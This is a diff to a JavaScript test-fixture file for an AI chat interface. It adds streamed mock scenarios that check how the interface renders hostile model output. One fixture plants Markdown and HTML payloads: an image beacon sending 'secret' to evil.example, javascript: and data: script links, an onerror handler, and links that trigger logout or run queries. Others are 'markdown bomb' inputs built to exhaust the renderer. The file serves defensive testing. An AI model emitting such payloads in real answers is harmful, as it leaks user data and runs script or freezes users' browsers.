@@ -135,6 +135,21 @@ const VRL_ANSWER = `This VRL parses an nginx access log line into structured fie
 
 I validated it against 5 sample events — all parsed.`;
 
+// WP-06: the `99` §1.2 planted Markdown payloads, as one answer.
+const PLANTED_MARKDOWN = [
+  "Here is what I found.",
+  "",
+  "![x](https://evil.example/p.gif?d=secret)",
+  "",
+  "[click](javascript:alert(1)) · [x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+  "",
+  '<a href="https://evil.example" target="_self">same tab</a> <img src=x onerror="window.__pwned=1">',
+  "",
+  "[Open dashboard](/web/logout) · [See](/web/ai/shared/abc) · [Logs](/web/logs?sql=c2VsZWN0&run=true)",
+  "",
+  "Read [the docs](https://openobserve.ai/docs/).",
+].join("\n");
+
 export const SCENARIOS = {
   complete: { frames: completeFrames(), delayMs: 25 },
   // Same turn but slow, so a screenshot can catch it mid-stream (tool running, text half-typed).
@@ -266,7 +281,170 @@ export const SCENARIOS = {
     frames: [f.status(), { raw: "data: this is not json" }, { raw: 'data: {"type":"made_up_frame"}' }, ...chunk("Still answered.").map(f.delta), f.complete()],
     delayMs: 40,
   },
+  // WP-06: the `99` §1.2 Markdown payloads in one answer (SEC-01, SEC-02, SEC-04); see fixtures/payloads.mjs.
+  payloads_markdown: { frames: [f.status(), f.delta(PLANTED_MARKDOWN), f.complete()], delayMs: 40 },
+  // WP-06 PERF-02 variant: a 400-delta unlabelled fence, then a 400-delta ```sql fence.
+  long_answer_fenced: { frames: [f.status(), ...fencedDeltas(), f.complete()], delayMs: 6 },
+  // WP-06 B-02 lifecycle frames as o2-ai PR #167 sends them (retrying, compacting, permission_denied).
+  retrying_frame: {
+    frames: [f.status(), { type: "retrying", attempt: 2, reason: "rate_limit", retry_after: 20 }],
+    delayMs: 40,
+    holdOpen: true,
+  },
+  compacting_frame: { frames: [f.status(), { type: "compacting" }], delayMs: 40, holdOpen: true },
+  permission_denied_frame: {
+    frames: [
+      f.status(),
+      f.toolCall("o2_UpdateAlert", "Updating alert", { name: "checkout-5xx" }, "call_9"),
+      { type: "step", id: "call_9", call_id: "call_9", kind: "write", label: "Updating alert", params: { call_id: "call_9" }, state: "failed" },
+      { type: "permission_denied", tool: "o2_UpdateAlert", policy: "opencode" },
+      ...chunk("I couldn't change the alert: the policy blocks it. Here is what to change instead.").map(f.delta),
+      f.complete(),
+    ],
+    delayMs: 40,
+  },
+  // WP-06 round 4: independent-verify-2 W1's bomb (a backtick in an HTML attribute hides 60k of `*a `), streamed in 4k deltas.
+  markdown_bomb: { frames: [f.status(), ...sliced(htmlAttrBomb(60_000), 4_000).map(f.delta), f.complete()], delayMs: 30 },
+  // W2: a 2,500-column table, the shape that runs the parser out of memory; it must render as plain text.
+  markdown_bomb_table: { frames: [f.status(), ...sliced(wideTable(2_500, 3_333), 4_000).map(f.delta), f.complete()], delayMs: 30 },
+  // Round 5 (independent-verify-3): X1 a reference link repeated into megabytes of HTML.
+  markdown_bomb_links: { frames: [f.status(), ...sliced(refLinkBomb(20_000, 3_000), 4_000).map(f.delta), f.complete()], delayMs: 30 },
+  // X2: wide tables inside a quote and after a fence opened in a quote, which skipped the round-4 cap.
+  markdown_bomb_quote_table: {
+    frames: [f.status(), ...sliced(quoteTable(1_000, 2_000) + "\n\n> ```\n\n" + wideTable(1_000, 2_000), 4_000).map(f.delta), f.complete()],
+    delayMs: 30,
+  },
+  // X3: thirty 2,000-character `*a:` bombs, each its own text block between tool steps.
+  markdown_bomb_small_blocks: { frames: [f.status(), ...smallBlockBombs(30)], delayMs: 10 },
+  // X4: fences the main thread used to highlight: java (not registered) and a long javascript one.
+  markdown_bomb_code: {
+    frames: [f.status(), f.delta("```java\n" + "$".repeat(20_000) + "\n```\n\n```javascript\n" + "a".repeat(9_000) + "\n```\n"), f.complete()],
+    delayMs: 30,
+  },
+  // Round 6 (independent-verify-4 Y1): tables marked builds but the old count missed, each under the 20k cap; every block is text.
+  markdown_bomb_table_rows: {
+    frames: [f.status(), ...textBlocks([gridTable(2, 1) + "\t\n".repeat(2_400), "h\n:-\n" + "a\n".repeat(9_990), (gridTable(2, 600) + "\n").repeat(2)])],
+    delayMs: 10,
+  },
+  // Y2, one answer each as independent-verify-4 measured them: a realistic 19k answer and 20k of list items, formatted; 200k of short lines, as text.
+  markdown_dense_answer: { frames: [f.status(), ...textBlocks([realisticAnswer(19_000)])], delayMs: 10 },
+  markdown_dense_list: { frames: [f.status(), ...textBlocks(["- a\n".repeat(4_990)])], delayMs: 10 },
+  markdown_dense_lines: { frames: [f.status(), ...textBlocks(["a\n".repeat(99_000)])], delayMs: 10 },
+  // The three together in one answer: measured and reported, not asserted (see the round-6 evidence).
+  markdown_dense: {
+    frames: [f.status(), ...textBlocks([realisticAnswer(19_000), "- a\n".repeat(4_990), "a\n".repeat(99_000)])],
+    delayMs: 10,
+  },
+  // Round 7 (independent-verify-5 Z1): a link whose escaped href is ten times its 2,000 raw characters, which looped the part splitter and crashed the tab.
+  markdown_bomb_long_link: {
+    frames: [f.status(), ...sliced("See the results below.\n\n[x](https://e.com/?" + "&".repeat(2_000) + ")\n\n**Done.**", 500).map(f.delta), f.complete()],
+    delayMs: 30,
+  },
+  // Follow-up D2: the server's id contract, as the real stack sent it. `turn_started` and `status` carry -1, several frames share a seq's id, and an id-only message marks a seq complete.
+  server_ids: {
+    frames: [
+      { type: "turn_started", turn_id: "turn", sseId: -1 },
+      { ...f.status(), sseId: -1 },
+      { ...f.delta("alpha"), sseId: -1 },
+      { boundary: 0 },
+      { ...f.delta(" beta"), sseId: 0 },
+      { ...f.delta(" gamma."), sseId: 0 },
+      { boundary: 1 },
+      { ...f.delta(" Then a second sentence: delta epsilon."), sseId: 1 },
+      { ...f.complete(), sseId: 1 },
+      { boundary: 2 },
+    ],
+    delayMs: 20,
+  },
+  // Round 8 (independent-verify-6 Q7): a broken image whose 19,900-character alt laid out as one run.
+  markdown_bomb_alt: {
+    frames: [f.status(), ...textBlocks(["Before.\n\n![" + "x".repeat(19_900) + "](data:image/png;base64,AAAA)\n\n**After.**"])],
+    delayMs: 10,
+  },
+  // Z2: a realistic answer of 150 query examples, each with its SQL fence, and 2,000 one-line fences.
+  markdown_query_examples: { frames: [f.status(), ...textBlocks([queryExamples(150)])], delayMs: 10 },
+  markdown_bomb_fences: { frames: [f.status(), ...textBlocks(["```\na\n```\n".repeat(2_000)])], delayMs: 10 },
+  // Y3 / F14: a 2,000-cell table formatted as plain cells, and the 19,999-cell table of round 5 as text.
+  markdown_table_cap: { frames: [f.status(), ...textBlocks([gridTable(10, 199), gridTable(8, 2_499)])], delayMs: 10 },
 };
+
+function queryExamples(count) {
+  let text = "Here are queries you can run:\n\n";
+  for (let i = 0; i < count; i++)
+    text += `**${i + 1}. Errors on host node-${i % 9}**\n\n\`\`\`sql\nSELECT count(*) FROM "default" WHERE level = 'error' AND host = 'node-${i % 9}'\n\`\`\`\n\n`;
+  return text;
+}
+
+// Each text streamed in 4k deltas as its own block, split from the next by a tool step.
+function textBlocks(texts) {
+  const frames = [];
+  texts.forEach((text, i) => {
+    frames.push(...sliced(text, 4_000).map(f.delta));
+    if (i === texts.length - 1) return;
+    frames.push(f.toolCall("StreamList", "Listing streams", { stream_type: "logs" }, `call_t${i}`));
+    frames.push(f.toolResult("StreamList", { call_id: `call_t${i}`, summary: "ok" }));
+  });
+  return [...frames, f.complete()];
+}
+
+function gridTable(columns, rows) {
+  return "| " + "h | ".repeat(columns) + "\n| " + "- | ".repeat(columns) + "\n" + ("| " + "val | ".repeat(columns) + "\n").repeat(rows);
+}
+
+// Sections of headings, emphasis, a link, nested and ordered lists, a small table, a SQL fence and a quoted claim.
+function realisticAnswer(chars) {
+  const section = (i) =>
+    `## Section ${i}: error rate analysis\n\nThe **ingester** on \`node-${i}\` reported a spike in [errors](https://openobserve.ai/docs/${i}) between 10:00 and 10:15. See the *details* below:\n\n` +
+    `- p95 latency rose to ${i * 3} ms\n- 5xx count: ${i * 7}\n  - mostly \`502\` from the proxy\n  - some \`504\`\n1. Check the stream\n2. Restart the pod\n\n` +
+    `| host | errors | p95 |\n| --- | ---: | ---: |\n| a-${i} | ${i} | 12 |\n| b-${i} | ${i * 2} | 15 |\n\n` +
+    `\`\`\`sql\nSELECT histogram(_timestamp) AS t, count(*) AS c FROM "default" WHERE level = 'error' AND host = 'a-${i}' GROUP BY t ORDER BY t\n\`\`\`\n\n` +
+    `> Note: this is a quoted remark with a [^call_${i}] claim marker.\n\n`;
+  let text = "";
+  for (let i = 0; text.length + section(i).length <= chars; i++) text += section(i);
+  return text;
+}
+
+function refLinkBomb(urlChars, uses) {
+  return "[a]: https://e.com/" + "x".repeat(urlChars) + "\n\n" + "[a] ".repeat(uses);
+}
+
+function quoteTable(columns, rows) {
+  return "> |" + "a|".repeat(columns) + "\n> |" + "-|".repeat(columns) + "\n" + "> |x\n".repeat(rows);
+}
+
+function smallBlockBombs(count) {
+  const frames = [];
+  for (let i = 0; i < count; i++) {
+    frames.push(f.delta("*a:".repeat(666)));
+    frames.push(f.toolCall("StreamList", "Listing streams", { stream_type: "logs" }, `call_b${i}`));
+    frames.push(f.toolResult("StreamList", { call_id: `call_b${i}`, summary: "ok" }));
+  }
+  return [...frames, f.complete()];
+}
+
+function htmlAttrBomb(n) {
+  return 'x <b title="`">' + "*a ".repeat(Math.floor(n / 3)) + "`x";
+}
+
+function wideTable(columns, rows) {
+  return "|" + "a|".repeat(columns) + "\n|" + "-|".repeat(columns) + "\n" + "|x\n".repeat(rows);
+}
+
+function sliced(text, size) {
+  const out = [];
+  for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size));
+  return out;
+}
+
+/** Two long fences streamed delta by delta: unlabelled first, then SQL (round 2 E-19). */
+function fencedDeltas() {
+  const deltas = [f.delta("Plain fence:\n\n```\n")];
+  for (let i = 0; i < 400; i++) deltas.push(f.delta(`line ${i} of raw output\n`));
+  deltas.push(f.delta("```\n\nSQL fence:\n\n```sql\n"));
+  for (let i = 0; i < 400; i++) deltas.push(f.delta(`SELECT ${i} AS n UNION ALL\n`));
+  deltas.push(f.delta("SELECT 400\n```\n"));
+  return deltas;
+}
 
 /** 400 deltas carrying three tables and two code blocks (HT-08, `00` §14). */
 function longAnswerDeltas() {
@@ -307,11 +485,11 @@ export const HTTP_SCENARIOS = {
   // WP-03: the request never reaches the server (`networkError`), or each wire shape of `__fixtures__/errors/wire`; `envelope` is the B-01 body (`envelopeEnabled`).
   offline: { networkError: true },
   unauthorized_401: { status: 401, body: { code: 401, message: "Unauthorized Access" }, envelope: { code: "session_expired", message: "Session expired", retryable: false } },
-  forbidden_403: { status: 403, body: { code: 403, message: "Unauthorized Access" }, envelope: { code: "permission_denied", message: "Forbidden", retryable: false, action: "contact_admin" } },
-  not_enabled_400: { status: 400, body: { code: 400, message: "AI is not enabled" }, envelope: { code: "not_enabled", message: "AI is not enabled", retryable: false, action: "contact_admin" } },
-  lease_409: { status: 409, body: { code: 409, message: "Another turn is already running in this conversation" }, envelope: { code: "turn_busy", message: "Another turn is already running", retryable: false, action: "wait", active_turn_id: "0199e7b2-7000-7a3e-a1b2-c3d4e5f60799" } },
+  forbidden_403: { status: 403, body: { code: 403, message: "Unauthorized Access" }, envelope: { code: "permission_denied", message: "Forbidden", retryable: false, action: "ask_admin" } },
+  not_enabled_400: { status: 400, body: { code: 400, message: "AI is not enabled" }, envelope: { code: "not_enabled", message: "AI is not enabled", retryable: false, action: "ask_admin" } },
+  lease_409: { status: 409, body: { code: 409, message: "Another turn is already running in this conversation" }, envelope: { code: "turn_busy", message: "Another turn is already running", retryable: false, action: "none", active_turn_id: "0199e7b2-7000-7a3e-a1b2-c3d4e5f60799" } },
   already_submitted_409: { status: 409, body: { code: 409, message: "This turn was already submitted; reload the conversation to see its result" }, envelope: { code: "already_submitted", message: "Already submitted", retryable: false, action: "reload" } },
-  upstream_429: { status: 429, body: { code: 429, error: "upstream returned 429 Too Many Requests" }, envelope: { code: "rate_limited", message: "Rate limited", retryable: true, retry_after: 30, action: "wait" } },
+  upstream_429: { status: 429, body: { code: 429, error: "upstream returned 429 Too Many Requests" }, envelope: { code: "rate_limited", message: "Rate limited", retryable: true, retry_after: 30, action: "retry" } },
   agent_503: { status: 503, body: { code: 503, error: "error sending request for url (http://o2-ai:8000/api/v1/chat/stream)" }, envelope: { code: "agent_unavailable", message: "Agent unavailable", retryable: true } },
   authz_503: { status: 503, body: { code: 503, message: "redis connection timed out" }, envelope: { code: "authorization_unavailable", message: "Authorization unavailable", retryable: true } },
   // The same-turn retry after Enable answers 412 again (consent_still_required).
